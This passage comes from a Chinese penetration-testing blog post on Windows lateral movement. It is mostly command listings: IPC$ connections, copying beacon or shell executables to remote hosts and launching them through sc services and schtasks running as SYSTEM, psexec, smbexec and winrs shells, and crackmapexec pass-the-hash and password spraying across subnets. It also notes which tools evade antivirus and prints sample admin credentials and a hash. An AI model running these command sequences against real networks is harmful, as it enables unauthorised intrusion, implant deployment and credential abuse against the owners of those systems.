class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">查看本机建立的连接 本机连接其他机器</span><br>net use <br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看本机建立的连接 其他机器连接的本机</span><br>net session <br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看本地开启的共享</span><br>net share <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">开启 ipc$ 共享</span><br>net share ipc$ <br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除 ipc$共享</span><br>net share ipc$ /del <br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除 admin$共享</span><br>net share admin$ /del <br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除 C 盘共享</span><br>net share c$ /del <br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除 D 盘共享</span><br>net share d$ /del <br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除所有连接</span><br>net use * /del <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">建立连接时 错误 67 找不到网络名证明是目标主机没有开放 445 端口或 ipc$共享</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">与 192.168.10.15 建立 ipc 空连接</span><br>net use \\192.168.10.15 <br><span class="hljs-meta prompt_"># </span><span class="language-bash">与 192.168.10.15 建立 ipc 空连接</span><br>net use \\192.168.10.15\ipc$ <br><span class="hljs-meta prompt_"># </span><span class="language-bash">与 192.168.10.15 建立 ipc 空连接</span><br>net use \\192.168.10.15\ipc$ /u:&quot;&quot; &quot;&quot; <br><span class="hljs-meta prompt_"># </span><span class="language-bash">以 administrator 身份与 192.168.10.15 建立 ipc 连接</span><br>net use \\192.168.10.15 /u:&quot;administrator&quot; &quot;root&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除建立的 ipc 连接</span><br>net use \\192.168.10.15 /del <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看远程主机开启的默认共享</span><br>net view \\192.168.10.15 <br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看该主机上的时间</span><br>net time \\192.168.10.15<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">建立 C 盘共享</span><br>net use \\192.168.10.15\c$ /u:&quot;administrator&quot; &quot;root&quot; <br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看 192.168.10.15C 盘文件</span><br>dir \\192.168.10.15\c$ <br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看 192.168.10.15C 盘文件下的 user 目录</span><br>dir \\192.168.10.15\c$\user <br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看 192.168.10.15C 盘文件下的 user 目录下的 test.exe 文件</span><br>dir \\192.168.10.15\c$\user\test.exe <br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除该 C 盘共享连接</span><br>net use \\192.168.10.15\c$ /del <br><span class="hljs-meta prompt_"># </span><span class="language-bash">将目标 C 盘映射到本地 K 盘</span><br>net use k: \\192.168.10.15\c$ /u:&quot;administrator&quot; &quot;root&quot; <br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除该映射</span><br>net use k: /del <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">============ 管理员建立连接可以做的事情（ 不管是连接还是被连接了, 都可以相互去做 ） ============</span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash">其实大部分的命令都可以, 只需要把原来的目标换成连接即可</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看目录, 也可以直接在资源管理器中输入, 直接去进行文件管理（ 增删改查 ）</span><br>dir \\192.168.75.139\c$<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看进程</span><br>tasklist /S 192.168.75.139<br>tasklist /S 192.168.75.139 /U administrator -P QWEasd@123<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看时间</span><br>net time \\192.168.75.139<br><span class="hljs-meta prompt_"># </span><span class="language-bash">文件操作等等...</span><br>copy SSMS-Setup-ENU.exe \\192.168.75.139\C$<br>del /F \\192.168.75.139\C$\SSMS-Setup-ENU.exe<br></code></pre></td></tr></table></figure>
+
+<p>可以发现 IPC$ 是可以直接操作文件的，其横向移动的思路就是移动文件到目标机器，然后想办法触发该文件实现上线。</p>
+<p>因为 windows 大部分命令的操作对象都可以是远程连接机器的资源，主要的利用方式有：</p>
+<ol>
+<li>计划任务：移动文件到目标机器，然后远程创建一个计划任务去执行该文件</li>
+<li>注册服务：移动文件到目标机器，然后远程创建并启动服务去执行该文件</li>
+</ol>
+<p>简单贴下命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">复制文件到远程机器</span><br>copy shell.exe \\192.168.75.139\C$<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">注册服务</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">sc 命令远程创建名为 <span class="hljs-built_in">test</span> 的服务</span><br>sc \\10.211.55.7 create test binpath= &quot;c:\beacon.exe&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">远程查询名为 <span class="hljs-built_in">test</span> 的服务</span><br>sc \\10.211.55.7 query test<br><span class="hljs-meta prompt_"># </span><span class="language-bash">远程启动名为 <span class="hljs-built_in">test</span> 的服务</span><br>sc \\10.211.55.7 start test<br><span class="hljs-meta prompt_"># </span><span class="language-bash">远程删除名为 <span class="hljs-built_in">test</span> 的服务</span><br>sc \\10.211.55.7 delete test<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">计划任务</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看远程机器的时间</span><br>net time \\10.211.55.7<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">at 创建计划任务</span><br>at \\10.211.55.7 14:37 C:\vps.exe<br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除</span><br>at \\10.211.55.7 ID /delete<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">schtasks 2008 以后使用（ 会留下日志 C:\Windows\Tasks\xx.txt ）</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">在目标主机 10.211.55.7 上创建一个名为 <span class="hljs-built_in">test</span> 的计划任务,启动权限为 system，启动时间为每隔一小时启动一次</span><br>schtasks /create /s 10.211.55.7 /tn test /sc HOURLY /mo 1 /tr c:\beacon.exe /ru system /f /U administrator /P root<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查询该 <span class="hljs-built_in">test</span> 计划任务</span><br>schtasks /query /s 10.211.55.7 /U administrator -P root | findstr test<br><span class="hljs-meta prompt_"># </span><span class="language-bash">启动该 <span class="hljs-built_in">test</span> 计划任务</span><br>schtasks /run /s 10.211.55.7 /i /tn &quot;test&quot; /U administrator -P root<br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除该 <span class="hljs-built_in">test</span> 计划任务</span><br>schtasks /delete /s 10.211.55.7 /tn &quot;test&quot; /f /U administrator -P root<br></code></pre></td></tr></table></figure>
+
+<p>感觉更多情况下可能是发现有别的机器连上了被控主机，那么就可以进行这些操作实现一个横向移动。</p>
+<h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><p>psexec 的基本原理是：通过管道上传一个二进制文件到目标机器的 C:\Windows 目录，并在远程目标机器上创建一个服务。然后，通过该服务运行二进制文件，运行结束后删除服务和二进制文件。</p>
+<p>由于创建或删除服务时会产生大量的日志，所以会在攻击溯源时通过日志反推攻击流程。</p>
+<p>并且该工具在执行上传的二进制文件时，会被杀毒软件查杀。所以在实战中不建议使用！</p>
+<p>利用条件：目标主机开启 445 端口和 admin$共享。因为 psexec 要往 C:\Windows 目录（ admin$ ） 下写二进制文件。对于 impacket 下的 psexec.py，除了 admin$共享外，还可以使用 C$ 共享。（ 其实都是写到 C:\Windows 目录下，所以 C$ 共享才可以 ）</p>
+<p>微软也提供有 Psexec 工具，该工具只依赖于 445 端口和 admin$共享，并且其上传的二进制文件名固定为 PSEXESVC.exe，创建的服务名固定为 PSEXESVC。</p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">获取 system 权限</span><br>psexec.exe \\192.168.75.130 -u administrator -p QWEasd@123 -s cmd.exe<br><span class="hljs-meta prompt_"># </span><span class="language-bash">获取 administrator 权限</span><br>psexec.exe \\192.168.75.130 -u administrator -p QWEasd@123 cmd.exe<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">建立连接</span><br>net use \\192.168.75.130 /u:&quot;administrator&quot; &quot;QWEasd@123&quot;<br>psexec.exe \\192.168.75.130 -s cmd.exe<br></code></pre></td></tr></table></figure>
+
+<h4 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h4><p>smbexec 是一个类似 psexec 的使用 RemComSvc 技术的工具，该工具通过文件共享在远程系统中创建服务，将要运行的命令通过服务写在 bat 文件中来执行，然后将执行的结果写在文件中来读取执行命令的输出，最后将 bat 文件、输出文件和服务都删除。</p>
+<p>虽然这种技术可能有助于躲避 AV ( 免杀，不会被杀毒软件查杀！)，但是创建或删除服务时会产生大量的日志，所以会在攻击溯源时通过日志<br>反推攻击流程。</p>
+<p>该攻击依赖于 445 端口，可以使用除 ipc$ 共享外的其他所有共享。</p>
+<p>总体来说，免杀很方便，简单测试了下，安了个火绒，wmiHacker、psexec 都噶了，smbexec 还可以。不过容易被溯源。</p>
+<h3 id="5985-端口"><a href="#5985-端口" class="headerlink" title="5985 端口"></a>5985 端口</h3><p>WinRM 是 Windows Remote Managementd（ Windows 远程管理 ）的简称。它基于 Web 服务管理(WebService-Management)标准，WinRM2.0 默认端口 5985（HTTP 端口）或 5986（HTTPS 端口）。</p>
+<p>如果所有的机器都是在域环境下，则可以使用默认的 5985 端口，否则的话需要使用 HTTPS 传输(5986 端口)。</p>
+<p>使用 WinRM 我们可以在对方有设置防火墙的情况下远程管理这台服务器，因为启动 WinRM 服务后，防火墙默认会放行 5985 端口。WinRM 服务在 Windows Server 2012 及以上服务器自动启动。</p>
+<p>在 WindowsVista 上，服务必须手动启动。 WinRM 的好处在于，这种远程连接不容易被察觉到，也不会占用远程连接数！</p>
+<p>这里需要注意的是，通过 WinRM 远程连接也是受到 LocalAccountTokenFilterPolicy 的值影响的。</p>
+<p>命令执行主要使用的是 winrs（ windows 远程 shell ）是 WinRM 的””客户端”，可以用它很简单去执行命令。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">winrs 启动一个 cmd 会话</span><br>winrs -r:http://192.168.75.130:5985 -u:administrator -p:QWEasd@123 cmd<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">如果是工作组环境运行，或客户端未加入域，则需要在客户端执行此命令（ 报错客户端啥的可以试一下 ）</span><br>Set-Item wsman:\localhost\Client\TrustedHosts -value *<br></code></pre></td></tr></table></figure>
+
+<p>扫描的话 crackMapExec 就可以实现。</p>
+<h2 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h2><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">Administrator<br>af2c62402cf3b913f8eb278aa0622ae9<br>QWEasd@<span class="hljs-number">123</span><br><span class="hljs-number">192.168.75.130</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="WmiHacker"><a href="#WmiHacker" class="headerlink" title="WmiHacker"></a>WmiHacker</h3><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/rootclay/WMIHACKER">https://github.com/rootclay/WMIHACKER</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">命令执行 GETRES? 表示 1（ 有回显 ）| 0（ 无回显 ）</span><br>cscript WMIHACKER.vbs /cmd  host  user  pass  command GETRES?<br><span class="hljs-meta prompt_"># </span><span class="language-bash">shell 模式返回一个 cmd shell</span><br>cscript WMIHACKER.vbs /shell  host  user  pass<br><span class="hljs-meta prompt_"># </span><span class="language-bash">上传文件</span><br>cscript WMIHACKER.vbs /upload  host  user  pass  localpath remotepath<br><span class="hljs-meta prompt_"># </span><span class="language-bash">下载文件</span><br>cscript WMIHACKER.vbs /download  host  user  pass  localpath remotepath<br></code></pre></td></tr></table></figure>
+
+<h3 id="SharpWmi"><a href="#SharpWmi" class="headerlink" title="SharpWmi"></a>SharpWmi</h3><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/sharpwmi">https://github.com/QAX-A-Team/sharpwmi</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sharpwmi.exe 192.168.2.3 administrator 123 cmd whoami<br>sharpwmi.exe 192.168.2.3 administrator 123 upload beacon.exe c:\beacon.exe<br></code></pre></td></tr></table></figure>
+
+<h3 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h3><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">pip3 install -r requirements.txt<br><span class="hljs-keyword">python3</span> setup.<span class="hljs-keyword">py</span> install<br><span class="hljs-keyword">cd</span> examples<br></code></pre></td></tr></table></figure>
+
+<p>[-] module ‘collections’ has no attribute ‘Callable’</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/K_essi/article/details/126047493">https://blog.csdn.net/K_essi/article/details/126047493</a></p>
+<p>smbexec 繁体中文：</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-codec Big5</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="crackMapExec"><a href="#crackMapExec" class="headerlink" title="crackMapExec"></a>crackMapExec</h3><p><a target="_blank" rel="noopener" href="https://github.com/Pennyw0rth/NetExec">https://github.com/Pennyw0rth/NetExec</a></p>
+<p>安装文档：<a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation">https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation</a></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cmd"># kali<br>apt-get install crackmapexec<br><br># pipx 安装<br>apt-get install -y libssl-dev libffi-dev python-dev build-essential python3-venv<br>python3 -m pip install pipx<br>pipx ensurepath &amp;&amp; source ~/.bashrc<br>git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec.git &amp;&amp; <span class="hljs-built_in">cd</span> CrackMapExec<br>pipx install .<br>crackmapexec<br># 安装失败尝试<br># 安装 rust 环境<br>curl --proto &#x27;=https&#x27; --tlsv1.<span class="hljs-number">2</span> -sSf https://sh.rustup.rs | sh<br># 加载环境变量<br>. &quot;$HOME/.cargo/env&quot;<br><br><span class="hljs-built_in">echo</span> &#x27;export <span class="hljs-built_in">PATH</span>=&quot;/root/.local/bin/:$<span class="hljs-built_in">PATH</span>&quot;&#x27; &gt;&gt; ~/.bashrc &amp;&amp; source ~/.bashrc<br></code></pre></td></tr></table></figure>
+
+<p>CrackMapExec 可以说是一款批量 PTH 的工具，可以去批量探测，批量执行命令，很方便。在拿到凭证后后，如果机器多就可以直接使用 CrackMapExec 进行批量密码喷洒，很方便。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">支持协议</span><br>mssql,wmi,vnc,ldap,smb,ssh,winrm,ftp,rdp<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u username -p password -H hash -x command<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">目标形式</span><br>192.168.1.0 192.168.0.2<br>192.168.1.0/24<br>192.168.1.0-28 10.0.0.1-67<br>targets.txt<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">username,password,<span class="hljs-built_in">hash</span></span><br>-u username<br>-u username1 username2 username3<br>-u usernames.txt<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">windows pth 135 端口</span><br>crackmapexec wmi 192.168.0.1/24 -u administrator -H hash<br>crackmapexec wmi 192.168.0.1/24 -u administrator -H hash -x &#x27;whoami&#x27;<br>crackmapexec wmi 192.168.0.1/24 -u administrator -p password<br>crackmapexec wmi 192.168.0.1/24 -u administrator -p password -x &#x27;whoami&#x27;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">windows pth 139,445 端口</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">smb 这里 crackmapexec 会尝试 wmiexec,mmcexec,smbexec,atexec 这几种方式</span><br>crackmapexec smb 192.168.0.1/24 -u administrator -H hash<br>crackmapexec smb 192.168.0.1/24 -u administrator -H hash -x &#x27;whoami&#x27;<br>crackmapexec smb 192.168.0.1/24 -u administrator -p password<br>crackmapexec smb 192.168.0.1/24 -u administrator -p password -x &#x27;whoami&#x27;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">windows pth 5985,5986 端口</span><br>crackmapexec winrm 192.168.0.1/24 -u administrator -H hash<br>crackmapexec winrm 192.168.0.1/24 -u administrator -H hash -x &#x27;whoami&#x27;<br>crackmapexec winrm 192.168.0.1/24 -u administrator -p password<br>crackmapexec winrm 192.168.0.1/24 -u administrator -p password -x &#x27;whoami&#x27;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>‍</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%8A%80%E6%9C%AF/" class="category-chain-item">技术</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="print-no-link">#内网渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>横向移动</div>
+      <div>https://liancccc.github.io/2024/09/15/技术/内网渗透/横向移动/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>守心</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年9月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/09/15/%E6%8A%80%E6%9C%AF/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" title="权限提升">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">权限提升</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/09/15/%E6%8A%80%E6%9C%AF/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/" title="隧道代理">
+                        <span class="hidden-mobile">隧道代理</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
